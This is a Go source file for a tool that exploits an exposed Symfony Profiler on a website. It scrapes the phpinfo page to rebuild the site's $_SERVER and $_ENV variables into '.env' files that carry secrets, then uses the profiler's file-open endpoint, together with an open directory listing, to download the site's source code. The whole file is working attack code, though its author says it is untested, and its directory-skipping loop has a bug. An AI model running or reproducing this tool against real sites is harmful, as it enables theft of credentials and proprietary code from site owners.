// This file allows you to download source code of a website through Symfony Profiler (if enabled, rare case but happens). It also requires open dir
package web // I ran out of testing subjects so I have no idea if this works or not

import (
	"errors"
	stdio "io"
	"net/http"
	"regexp"
	"strings"

	"github.com/nextu1337/nxutils/io"
)

func writeSymfonyEnv(url string, vd *io.Directory) error {
	serverVarFile := ""
	envVarFile := ""

	req, err := http.Get(url)
	if err != nil {
		return errors.New("Failed to get PHP info")
	}

	defer req.Body.Close()

	content, err := stdio.ReadAll(req.Body)
	if err != nil {
		return errors.New("Failed to read PHP info")
	}

	// Write to virtual disk, just in case
	vd.WriteFile("phpinfo.html", content)

	// Parse PHP info
	htmlRe := regexp.MustCompile(`<h2>PHP Variables<\/h2>([\s\S]*?)<\/table>`)
	htmlMatch := htmlRe.FindAllStringSubmatch(string(content), -1)
	if len(htmlMatch) == 0 {
		return errors.New("PHP Variables not found")
	}

	// phpVarsRe := regexp.MustCompile("<tr><td class=\"e\">(.*?)");
	phpVars := htmlMatch[0][1]

	serverVarsRe := regexp.MustCompile(`<tr[^>]*>\s*<td[^>]*>\$_SERVER\[\'([^\']+)\'\]<\/td>\s*<td[^>]*>(.*?)<\/td>\s*<\/tr>`)
	serverVarsMatches := serverVarsRe.FindAllStringSubmatch(phpVars, -1)
	for _, match := range serverVarsMatches {
		serverVarFile += match[1] + "=" + match[2] + "\n"
	}

	envVarsRe := regexp.MustCompile(`<tr[^>]*>\s*<td[^>]*>\$_ENV\[\'([^\']+)\'\]<\/td>\s*<td[^>]*>(.*?)<\/td>\s*<\/tr>`)
	envVarsMatches := envVarsRe.FindAllStringSubmatch(phpVars, -1)
	for _, match := range envVarsMatches {
		envVarFile += match[1] + "=" + match[2] + "\n"
	}

	vd.WriteFile("server.env", []byte(serverVarFile))
	vd.WriteFile(".env", []byte(envVarFile))

	return nil
}

func downloadSymfonyProfilerFile(profilerUrl string, relativePath string) ([]byte, error) {
	//     const r = await fetch(profiler+"/open?line=1&file="+relativePath)
	req, err := http.Get(profilerUrl + "/open?line=1&file=" + relativePath)
	if err != nil {
		return nil, errors.New("Failed to get file")
	}

	defer req.Body.Close()

	content, err := stdio.ReadAll(req.Body)
	if err != nil {
		return nil, errors.New("Failed to read file")
	}

	codeRe := regexp.MustCompile(`<code>(.*?)<\/code>`)
	codeMatch := codeRe.FindAllStringSubmatch(string(content), -1)
	if len(codeMatch) == 0 {
		return nil, errors.New("Failed to find code")
	}

	htmlTagsRe := regexp.MustCompile(`<[^>]*>`)

	code := ""
	for _, match := range codeMatch {
		code += htmlTagsRe.ReplaceAllString(match[1], "")
	}

	return []byte(HTMLDecode(code)), nil
}

// both openDirUrl and profilerUrl are absolute URLs, not relative paths.
// openDirUrl is the root of the website which has to be opendir, profilerUrl is the URL of the profiler
// Example usage: DownloadSymfonyProfilerSRC("http://localhost:8000", "http://localhost:8000/_profiler")
func DownloadSymfonyProfilerSRC(openDirUrl string, profilerUrl string) (*io.Directory, error) {
	vd := io.NewVirtualDisk()
	ignoredDirs := []string{"vendor", "bin", "Type", "cache"} // No need to download these
	openDirUrl = strings.TrimSuffix(openDirUrl, "/")
	profilerUrl = strings.TrimSuffix(profilerUrl, "/")

	if writeSymfonyEnv(profilerUrl+"/phpinfo", vd) != nil {
		return nil, errors.New("Failed to write Symfony env")
	}

	// Downloading the source code
	files, err := ListOpenDirFilesRecursive(openDirUrl, "/")
	if err != nil {
		return nil, err
	}

	for _, file := range files {
		for _, dir := range ignoredDirs {
			if strings.Contains(file, dir) { // TODO: maybe consider adding / in beginning or end idk
				continue
			}
		}

		content, err := downloadSymfonyProfilerFile(profilerUrl, file)
		if err != nil {
			continue
		}

		vd.WriteFile(file, content)
	}

	return vd, nil
}
